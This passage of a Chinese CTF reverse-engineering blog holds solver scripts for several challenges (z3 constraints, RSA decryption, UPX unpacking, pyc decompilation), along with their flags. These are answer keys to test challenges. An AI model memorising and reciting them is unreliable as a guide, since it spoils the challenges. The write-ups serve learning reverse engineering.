s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">13464540</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">767478780</span> <span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">5488432</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">312840624</span> <span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">14479500</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1404511500</span> <span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">6451830</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">316139670</span> <span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">6252576</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">619005024</span> <span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">7763364</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">372641472</span> <span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">7327320</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">373693320</span> <span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">8741520</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">498266640</span> <span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">8871876</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">452465676</span> <span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">4086720</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">208422720</span> <span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">9374400</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">515592000</span> <span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">5759124</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">719890500</span><span class="token punctuation">)</span>
<span class="token comment"># z3约束求解</span>
s<span class="token punctuation">.</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span>
res <span class="token operator">=</span> s<span class="token punctuation">.</span>model<span class="token punctuation">(</span><span class="token punctuation">)</span>
res <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
a <span class="token operator">=</span> res<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>

flag <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">31</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    temp <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span>
    temp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>
    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>temp<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token comment"># flag&#123;e65421110ba03099a1c039337&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>开始没发现a1[6]并没有给，看wp知道a1[6]的值为<code>1</code>，故flag为</p>
<pre class="line-numbers language-none"><code class="language-none">flag&#123;e165421110ba03099a1c039337&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="SUCTF2019-SignIn"><a href="#SUCTF2019-SignIn" class="headerlink" title="[SUCTF2019]SignIn"></a>[SUCTF2019]SignIn</h3><p><strong>TAG:RSA、ELF文件</strong></p>
<p>没壳，打开一看不就是RSA吗，看到65537就感觉不简单，简单解下RSA即可</p>
<p><img src="/2021/05/28/CTF/image-20210607165616788.png" alt></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes

n <span class="token operator">=</span> <span class="token number">103461035900816914121390101299049044413950405173712170434161686539878160984549</span>
c <span class="token operator">=</span> <span class="token number">0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35</span>
e <span class="token operator">=</span> <span class="token number">65537</span>
p <span class="token operator">=</span> <span class="token number">282164587459512124844245113950593348271</span>
q <span class="token operator">=</span> n <span class="token operator">//</span> p
phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>
m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
m <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>
flag <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
<span class="token comment"># b'suctf&#123;Pwn_@_hundred_years&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="WUSTCTF2020-level1"><a href="#WUSTCTF2020-level1" class="headerlink" title="[WUSTCTF2020]level1"></a>[WUSTCTF2020]level1</h3><p><strong>TAG:一般题目</strong></p>
<p>给出了两个附件，一个是txt文件，另一个是一般的ELF的64位文件，txt文件给出的应该是程序的输出，将程序拖入64位ida分析，找到关键代码如下:</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-2Ch]</span>
  FILE <span class="token operator">*</span>stream<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-28h]</span>
  <span class="token keyword">char</span> ptr<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-20h] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-8h]</span>

  v7 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  stream <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fread</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">,</span> <span class="token number">0x14uLL</span><span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fclose</span><span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">19</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>i <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token punctuation">)</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%ld\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%ld\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">*</span> ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>一般的差不多算是加密的东西，直接得(太签到了)</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">out <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">198</span><span class="token punctuation">,</span> <span class="token number">232</span><span class="token punctuation">,</span> <span class="token number">816</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">1536</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">6144</span><span class="token punctuation">,</span> <span class="token number">984</span><span class="token punctuation">,</span> <span class="token number">51200</span><span class="token punctuation">,</span> <span class="token number">570</span><span class="token punctuation">,</span> <span class="token number">92160</span><span class="token punctuation">,</span> <span class="token number">1200</span><span class="token punctuation">,</span> <span class="token number">565248</span><span class="token punctuation">,</span> <span class="token number">756</span><span class="token punctuation">,</span> <span class="token number">1474560</span><span class="token punctuation">,</span> <span class="token number">800</span><span class="token punctuation">,</span> <span class="token number">6291456</span><span class="token punctuation">,</span> <span class="token number">1782</span><span class="token punctuation">,</span> <span class="token number">65536000</span><span class="token punctuation">]</span>
<span class="token comment"># 上面首位加上0作为填充位</span>

res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> i<span class="token operator">&amp;</span><span class="token number">1</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
        temp <span class="token operator">=</span> out<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>></span> i
        res<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        temp <span class="token operator">=</span> out<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">//</span> i
        res<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> res<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># ctf2020&#123;d9-dE6-20c&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="WUSTCTF2020-level2"><a href="#WUSTCTF2020-level2" class="headerlink" title="[WUSTCTF2020]level2"></a>[WUSTCTF2020]level2</h3><p><strong>TAG:UPX脱壳</strong></p>
<p>打开没有后缀名，misc做习惯了之后总是先把这种比较小得没有后缀名的文件先使用记事本打开看看有什么东西。注意到UPX，直接脱壳</p>
<pre class="line-numbers language-none"><code class="language-none">.\upx.exe -d .\attachment\attachment<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2021/05/28/CTF/image-20210610004111012.png" alt></p>
<p><img src="/2021/05/28/CTF/image-20210610005411954.png" alt></p>
<p>但是这个似乎不是64位的可执行文件，而是i386。。应该是32位，ida32打开之后看函数太多先查找字符串</p>
<p><img src="/2021/05/28/CTF/image-20210610010158519.png" alt></p>
<p>我踏马直接大雾，这是什么牛马，这为啥就直接就在这，这是签到吗，为啥还叫level2啊。。。想了许久，也许比赛本来是面向新生的，新生可能对upx的脱壳方法不太了解罢。</p>
<pre class="line-numbers language-none"><code class="language-none">wctf2020&#123;Just_upx_-d&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="GWCTF-2019-xxor"><a href="#GWCTF-2019-xxor" class="headerlink" title="[GWCTF 2019]xxor"></a>[GWCTF 2019]xxor</h3><p><strong>TAG:</strong></p>
<p><img src="/2021/05/28/CTF/image-20210610010527059.png" alt></p>
<p>关键<code>mian</code>函数</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-68h]</span>
  <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-64h]</span>
  __int64 v6<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-60h] BYREF</span>
  __int64 v7<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+40h] [rbp-30h] BYREF</span>

  v7<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Let us play a game?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"you have six chances to input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Come on!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v6<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  v6<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  v6<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  v6<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  v6<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token string">"input: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    a2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v6 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  v7<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  v7<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  v7<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  v7<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  v7<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    dword_601078 <span class="token operator">=</span> v6<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>
    dword_60107C <span class="token operator">=</span> <span class="token function">HIDWORD</span><span class="token punctuation">(</span>v6<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    a2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_601060<span class="token punctuation">;</span>
    <span class="token function">sub_400686</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dword_601078<span class="token punctuation">,</span> <span class="token operator">&amp;</span>unk_601060<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">LODWORD</span><span class="token punctuation">(</span>v7<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">=</span> dword_601078<span class="token punctuation">;</span>
    <span class="token function">HIDWORD</span><span class="token punctuation">(</span>v7<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">=</span> dword_60107C<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_400770</span><span class="token punctuation">(</span>v7<span class="token punctuation">,</span> a2<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"NO NO NO~ "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Congratulation!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You seccess half\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Do not forget to change input to hex and combine~\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"ByeBye"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>明天再说</p>
<h2 id="注册程序的破解-CTF向"><a href="#注册程序的破解-CTF向" class="headerlink" title="注册程序的破解(CTF向)"></a>注册程序的破解(CTF向)</h2><h3 id><a href="#" class="headerlink" title=" "></a> </h3><h2 id="其他文件逆向"><a href="#其他文件逆向" class="headerlink" title="其他文件逆向"></a>其他文件逆向</h2><h3 id="pyc文件逆向"><a href="#pyc文件逆向" class="headerlink" title="pyc文件逆向"></a>pyc文件逆向</h3><h4 id="GWCTF-2019-pyre"><a href="#GWCTF-2019-pyre" class="headerlink" title="[GWCTF 2019]pyre"></a>[GWCTF 2019]pyre</h4><p><strong>考的知识点</strong></p>
<p>主要是<code>异或</code>、<code>取模</code>的特性，都很简单，这里就不再多做介绍了。异或的特性主要就是<code>a^a^b=b</code></p>
<p><strong>解题过程</strong></p>
<p>懒得再下函数库了，直接<a target="_blank" rel="noopener" href="https://tool.lu/pyc/">在线网站</a>搞算了。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
<span class="token comment"># visit http://tool.lu/pyc/ for more information</span>
<span class="token keyword">print</span> <span class="token string">'Welcome to Re World!'</span>
<span class="token keyword">print</span> <span class="token string">'Your input1 is your flag~'</span>
l <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>input1<span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">:</span>
    num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>input1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">128</span> <span class="token operator">+</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">128</span>
    code <span class="token operator">+=</span> num

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> code<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span>

<span class="token keyword">print</span> code
code <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'\x1f'</span><span class="token punctuation">,</span><span class="token string">'\x12'</span><span class="token punctuation">,</span><span class="token string">'\x1d'</span><span class="token punctuation">,</span><span class="token string">'('</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'\x01'</span><span class="token punctuation">,</span><span class="token string">'\x06'</span><span class="token punctuation">,</span><span class="token string">'\x14'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">','</span><span class="token punctuation">,</span><span class="token string">'\x1b'</span><span class="token punctuation">,</span><span class="token string">'U'</span><span class="token punctuation">,</span><span class="token string">'?'</span><span class="token punctuation">,</span><span class="token string">'o'</span><span class="token punctuation">,</span><span class="token string">'6'</span><span class="token punctuation">,</span><span class="token string">'*'</span><span class="token punctuation">,</span><span class="token string">':'</span><span class="token punctuation">,</span><span class="token string">'\x01'</span><span class="token punctuation">,</span><span class="token string">'D'</span><span class="token punctuation">,</span><span class="token string">';'</span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">,</span><span class="token string">'\x13'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>逆向的脚本如下，这里是老逆向知识考点了，感觉很老很老的了。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
<span class="token comment"># visit http://tool.lu/pyc/ for more information</span>
<span class="token triple-quoted-string string">"""
print('Welcome to Re World!')
print('Your input1 is your flag~')
input1 = 'flag'
code = ''
l = len(input1)
for i in range(l):
    num = ((ord(input1[i]) + i) % 128 + 128) % 128
    code += chr(num)

for i in range(l - 1):
    code[i] = code[i] ^ code[i + 1]
"""</span>

code <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'\x1f'</span><span class="token punctuation">,</span> <span class="token string">'\x12'</span><span class="token punctuation">,</span> <span class="token string">'\x1d'</span><span class="token punctuation">,</span> <span class="token string">'('</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'\x01'</span><span class="token punctuation">,</span> <span class="token string">'\x06'</span><span class="token punctuation">,</span> <span class="token string">'\x14'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">','</span><span class="token punctuation">,</span> <span class="token string">'\x1b'</span><span class="token punctuation">,</span> <span class="token string">'U'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">,</span>
